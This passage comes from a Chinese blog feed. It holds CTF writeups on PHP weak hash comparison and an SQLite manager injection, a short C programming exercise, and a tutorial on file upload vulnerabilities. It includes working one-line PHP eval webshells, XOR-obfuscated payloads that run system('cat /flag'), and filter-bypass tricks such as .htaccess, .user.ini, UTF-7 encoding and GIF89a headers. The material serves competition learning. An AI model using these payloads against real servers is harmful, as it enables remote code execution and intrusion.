$s拼接上$r后如果和$h相等的话，就可以得到flag</p><p>这里的<code>==</code>存在弱类型比较问题</p><blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">&quot;0e123456789&quot;</span> == <span class="string">&quot;0&quot;</span>);<span class="comment">//bool(true)</span></span><br><span class="line">var_dump(<span class="string">&quot;0e123456789&quot;</span> === <span class="string">&quot;0&quot;</span>);<span class="comment">//bool(false)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>已知用md5加密<code>s878926199a</code>后的结果是以0e开头的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> md5(<span class="string">&quot;s878926199a&quot;</span>);</span><br><span class="line"><span class="comment">//0e545993274517709034328855841020</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>所以$h=s878926199a，md5加密后为32位，减去$r的6位后，也就是说$s是以0e开头的26位数</p><p>可以是$s=0e111111111111111111111111</p><p>即<code>s=0e111111111111111111111111&amp;h=s878926199a</code></p><p>当然可以是这样的</p><p><code>s=0e&amp;h=s878926199a</code></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一道ACM测试赛的题目</title>
      <link href="2020/10/29/%E4%B8%80%E9%81%93ACM%E6%B5%8B%E8%AF%95%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AE/"/>
      <url>2020/10/29/%E4%B8%80%E9%81%93ACM%E6%B5%8B%E8%AF%95%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<p>题目：查找缺失的元素</p><p>太久没做类似这种题了，一道很简单的题目，竟然用了20多分钟才做出来😥</p><h2 id="查找缺失的元素"><a href="#查找缺失的元素" class="headerlink" title="查找缺失的元素"></a>查找缺失的元素</h2><p>描述：给定一个数组，找出其中的最大值n，输出[0,n]在该数组中缺失的元素。</p><p>输入：输入任意个自然数，当输入为-1时，结束输入。</p><p>输出：输出缺失的元素，每两个元素之间用空格分隔。</p><a id="more"></a><p>例1：</p><p>输入：0 1 4 -1</p><p>输出：2 3</p><p>例2：</p><p>输入：5 8 -1</p><p>输出：0 1 2 3 4 6 7</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>① 输入数字，直到输入-1则停止输入</p><p>② 找到数组中的最大值</p><p>③ 输出[0,n]在该数组中缺失的元素</p><h3 id="①-输入数字，直到输入-1则停止输入"><a href="#①-输入数字，直到输入-1则停止输入" class="headerlink" title="① 输入数字，直到输入-1则停止输入"></a>① 输入数字，直到输入-1则停止输入</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line"><span class="keyword">while</span>(x != <span class="number">-1</span>)&#123;</span><br><span class="line">a[i++] = x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="②-找到数组中的最大值"><a href="#②-找到数组中的最大值" class="headerlink" title="② 找到数组中的最大值"></a>② 找到数组中的最大值</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line"><span class="keyword">while</span>(x != <span class="number">-1</span>)&#123;</span><br><span class="line">a[i++] = x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> max = a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>; j&lt;i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &gt; max)&#123;</span><br><span class="line">max = a[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="③-输出-0-n-在该数组中缺失的元素"><a href="#③-输出-0-n-在该数组中缺失的元素" class="headerlink" title="③ 输出[0,n]在该数组中缺失的元素"></a>③ 输出[0,n]在该数组中缺失的元素</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line"><span class="keyword">while</span>(x != <span class="number">-1</span>)&#123;</span><br><span class="line">a[i++] = x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">int</span> max = a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>; j&lt;i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &gt; max)&#123;</span><br><span class="line">max = a[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">int</span> tag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;max; k++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(k == a[j])&#123;</span><br><span class="line">tag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(tag == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, k);</span><br><span class="line"><span class="keyword">if</span>(k != max<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">tag = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 其它 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其它 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>菜鸡划水队 writeup</title>
      <link href="2020/10/24/%E8%8F%9C%E9%B8%A1%E5%88%92%E6%B0%B4%E9%98%9Fwriteup/"/>
      <url>2020/10/24/%E8%8F%9C%E9%B8%A1%E5%88%92%E6%B0%B4%E9%98%9Fwriteup/</url>
      
        <content type="html"><![CDATA[<p>比赛：2020全国工业互联网安全技术技能大赛  学生组</p><p>正如队名一样，我们只是来划水的签到选手</p><a id="more"></a><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>拼图，拼完就可以得到flag</p><p><a href="https://imgchr.com/i/BZ3GXn"><img src="https://s1.ax1x.com/2020/10/24/BZ3GXn.png" alt="BZ3GXn.png"></a></p><ul><li>flag</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;welcome_to_chinaiisc2020&#125;</span><br></pre></td></tr></table></figure><h2 id="SimpleCalculator"><a href="#SimpleCalculator" class="headerlink" title="SimpleCalculator"></a>SimpleCalculator</h2><p>不知道怎么用这个计算器来计算，查看网页源码，尝试用 <strong>?search</strong> 传参</p><p><a href="https://imgchr.com/i/BZwcxf"><img src="https://s1.ax1x.com/2020/10/24/BZwcxf.png" alt="BZwcxf.png"></a></p><p><a href="https://imgchr.com/i/BZwoin"><img src="https://s1.ax1x.com/2020/10/24/BZwoin.png" alt="BZwoin.png"></a></p><p>尝试使用异或绕过</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urldecode(<span class="string">&#x27;%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line">$b = urldecode(<span class="string">&#x27;%a0%b8%ba%ab&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a^$b;</span><br><span class="line"><span class="comment">//输出_GET</span></span><br></pre></td></tr></table></figure></blockquote><ul><li>构造phpinfo()</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"></span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/BZ0FsO"><img src="https://s1.ax1x.com/2020/10/24/BZ0FsO.png" alt="BZ0FsO.png"></a></p><ul><li>构造webshell</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%ff]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%a0]);&amp;%ff=assert&amp;%a0=<span class="keyword">eval</span>($_POST[%<span class="number">27</span>cmd%<span class="number">27</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">//$&#123;_GET&#125;[assert]($&#123;_GET&#125;[eval($_POST[%27cmd%27])]);</span></span><br></pre></td></tr></table></figure><p>使用蚁剑查看</p><blockquote><p><code>http://eci-2ze7n0wiyptutv9upaxm.cloudeci1.ichunqiu.com/flag.php?search=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%ff]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%a0]);&amp;%ff=assert&amp;%a0=eval($_POST[%27cmd%27])</code></p></blockquote><p><a href="https://imgchr.com/i/BeJGrj"><img src="https://s1.ax1x.com/2020/10/25/BeJGrj.png" alt="BeJGrj.png"></a></p><p>在网站根目录下找到flag</p><ul><li>flag</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;08768680-a69a-42f1-b515-4220cf7e9a0d&#125;</span><br></pre></td></tr></table></figure><p>其它方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?search=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;($&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%a0&#125;);&amp;%ff=system&amp;%a0=cat%<span class="number">20</span>/flag</span><br><span class="line"></span><br><span class="line"><span class="comment">//?search=$&#123;_GET&#125;&#123;system&#125;($&#123;_GET&#125;&#123;cat /flag&#125;);</span></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/BeJ0RU"><img src="https://s1.ax1x.com/2020/10/25/BeJ0RU.png" alt="BeJ0RU.png"></a></p><h2 id="SQLManager"><a href="#SQLManager" class="headerlink" title="SQLManager"></a>SQLManager</h2><p>参考文章：<a href="https://www.anquanke.com/post/id/200927#h3-6">https://www.anquanke.com/post/id/200927#h3-6</a></p><p>题目说这是个<strong>简易的SQLite管理器。</strong></p><p>而SQLite管理器有一个自动创建的库<code>sqlite_master</code>，里面保存了所有表名以及创建表时的create语句。在创建表时可以用<code>as</code>来复制另一个表中的数据，所以我们可以从中获取到flag的表名和字段名。</p><p>在建表界面用burp suite抓包，重放包得到flag的表名和字段名</p><p><a href="https://imgchr.com/i/BZGcFK"><img src="https://s1.ax1x.com/2020/10/24/BZGcFK.png" alt="BZGcFK.png"></a></p><p><strong><code>table_name=a as select sql as[&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=INTEGER</code></strong></p><p><a href="https://imgchr.com/i/BZJ49U"><img src="https://s1.ax1x.com/2020/10/24/BZJ49U.png" alt="BZJ49U.png"></a></p><p><a href="https://imgchr.com/i/BZJv9O"><img src="https://s1.ax1x.com/2020/10/24/BZJv9O.png" alt="BZJv9O.png"></a></p><p>这里可以得知flag所在的表：<strong>flag_Y0U_c4nt_GUESS</strong>，以及所在的字段：<strong>flag_ThE_C0lumn</strong></p><p>删表后再次抓包，表名为 <code>b</code> ，继续用burp suite重放包</p><p>将<strong>a</strong>改为<strong>b</strong>，<strong>sql</strong>改为<strong>flag_Y0U_c4nt_GUESS</strong>，将<strong>sqlite_master</strong>改为<strong>flag_ThE_C0lumn</strong></p><p><strong><code>table_name=b as select [flag_ThE_C0lumn] as[&amp;columns[0][name]=]from flag_Y0U_c4nt_GUESS;&amp;columns[0][type]=INTEGER</code></strong></p><p><a href="https://imgchr.com/i/BZtflF"><img src="https://s1.ax1x.com/2020/10/24/BZtflF.png" alt="BZtflF.png"></a></p><ul><li>flag</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;486756b1-d23c-4236-b44c-cd43640098c6&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="2020/10/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/10/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。</p><p>通常造成文件上传漏洞的原因是：对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。</p><blockquote><p>文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。</p><p>这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p></blockquote><a id="more"></a><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="htaccess任意文件解析"><a href="#htaccess任意文件解析" class="headerlink" title=".htaccess任意文件解析"></a>.htaccess任意文件解析</h3><blockquote><p>.htaccess可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、封禁特定IP地址的用户，只允许特定IP地址的用户，以及使用其他文件作为index文件配置默认文档等功能。</p></blockquote><p>当服务器是上传使用的是黑名单机制，但是锁死了不给上传php后缀的文件，我们可以使用.htaccess文件重新配置当前文件的解析后缀为其他后缀绕过导致其他后缀的文件被解析为php。导致远程代码执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><blockquote><p>.htaccess文件配置信息,这里将后缀为.aaa的文件均解析为php文件</p></blockquote><h3 id="短标签绕过"><a href="#短标签绕过" class="headerlink" title="短标签绕过"></a>短标签绕过</h3><p>假设<code>&lt;?php</code> 被被过滤，同时PHP版本为5可以使用段标签绕过。</p><ul><li>JS风格</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>短标签风格</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>&lt;?=?&gt;</code>与<code>&lt;?php echo ....?&gt;</code>等效</p></blockquote><ul><li>ASP风格</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% phpinfo();%&gt;</span><br></pre></td></tr></table></figure><ul><li>官方默认风格</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="特殊编码绕过-UTF-7"><a href="#特殊编码绕过-UTF-7" class="headerlink" title="特殊编码绕过(UTF-7)"></a>特殊编码绕过(UTF-7)</h3><p>如果程序过滤了所有标签形式、或者说过滤了<code>&lt;?</code>而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下<code>&lt;?php</code>形式），这时候可以使用<code>.htaccess</code>解码对应的文件，例如可以使用UTF-7进行解码：(<a href="https://www.novel.tools/encode/UTF-7%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E7%BC%96%E7%A0%81%E5%92%8C%E8%A7%A3%E7%A0%81UTF-7%EF%BC%89">https://www.novel.tools/encode/UTF-7这个网站可以编码和解码UTF-7）</a></p><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4-</span><br></pre></td></tr></table></figure><blockquote><?php @eval($_POST['cmd']);?></blockquote><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>假如对上传文件的内容中的php，POST，eval替换为空，那么我们可以用这样的方式绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>pphphp</span><br><span class="line">@eevalval($_PPOSTOST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure></blockquote><h3 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h3><p>假如<code>.htaccess</code>被过滤了，不允许上传，而上传目录下有一个php文件，则可以使用.user.ini将我们制定文件包含到我们目录下的所有PHP文件导致远程代码执行。</p><ul><li>1.aaa</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><ul><li>.user.ini</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;1.aaa</span><br></pre></td></tr></table></figure><blockquote><p>加载其它php文件的时候，会先加载<code>.user.ini</code>里的<code>1.aaa</code></p></blockquote><h3 id="htaccess文件换行绕过"><a href="#htaccess文件换行绕过" class="headerlink" title=".htaccess文件换行绕过"></a>.htaccess文件换行绕过</h3><p>上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。</p><p>.htaccess支持换行编写所以使用换行可以直接上传成功并解析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType appli\</span><br><span class="line">cation&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><blockquote><p>过滤掉application，则使用换行绕过</p></blockquote><h3 id="文件包含解码Base64"><a href="#文件包含解码Base64" class="headerlink" title="文件包含解码Base64"></a>文件包含解码Base64</h3><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.aaa&quot;</span><br></pre></td></tr></table></figure><h3 id="动态拼接函数绕过函数过滤"><a href="#动态拼接函数绕过函数过滤" class="headerlink" title="动态拼接函数绕过函数过滤"></a>动态拼接函数绕过函数过滤</h3><p>对危险函数进行了过滤，不允许上传，则可以使用aiisc码拼接动态构造函数来绕过。</p><p>使用脚本快速生成指定函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;chr(&quot;</span>.ord($a[$i]).<span class="string">&quot;).&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111)</p><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);</span><br><span class="line">$a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="图片头绕过"><a href="#图片头绕过" class="headerlink" title="图片头绕过"></a>图片头绕过</h3><p>上传1.aaa，被检测到文件不是图片类型，则可以通过以下方法绕过，则有可能被识别为图片，绕过检测。</p><h4 id="XMB文件头绕过"><a href="#XMB文件头绕过" class="headerlink" title="XMB文件头绕过"></a>XMB文件头绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);</span><br><span class="line">$a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="GIF89a"><a href="#GIF89a" class="headerlink" title="GIF89a"></a>GIF89a</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);</span><br><span class="line">$a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="upload2"><a href="#upload2" class="headerlink" title="upload2"></a>upload2</h3><p>发现不能上传php文件，且文件内容不能使用官方默认风格(上传提示：Can’t upload php file)，所以尝试使用其它标签绕过</p><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>在根目录下找到flag。</p><p><img src="https://s1.ax1x.com/2020/08/10/abJwIH.png" 